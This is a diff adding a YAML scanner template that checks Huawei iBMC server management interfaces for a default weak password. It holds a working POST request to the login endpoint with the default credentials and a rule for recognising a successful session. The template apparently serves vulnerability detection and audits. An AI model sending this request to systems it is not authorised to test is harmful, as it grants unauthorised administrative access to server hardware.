@@ -1,0 +1,20 @@
+id: poc-yaml-huawei-ibmc-default-weak-pass
+info:
+  name: 华为 iBMC 默认弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: Huawei
+  osprey-id: vb_2021_0053
+requests:
+- method: POST
+  path: /bmc/php/processparameter.php
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101
+      Firefox/86.0
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: check_pwd=root&logtype=0&user_name=Huawei12%23$&func=AddSession&IsKvmApp=0
+  expression: "status_code == 200 && (\n  contains(body, \"[{ %22AddSession%22:\"\
+    ) ||\n  contains(body, \"[{ %2522AddSession%2522:\")\n)\n"
+variables: {}
+transport: http
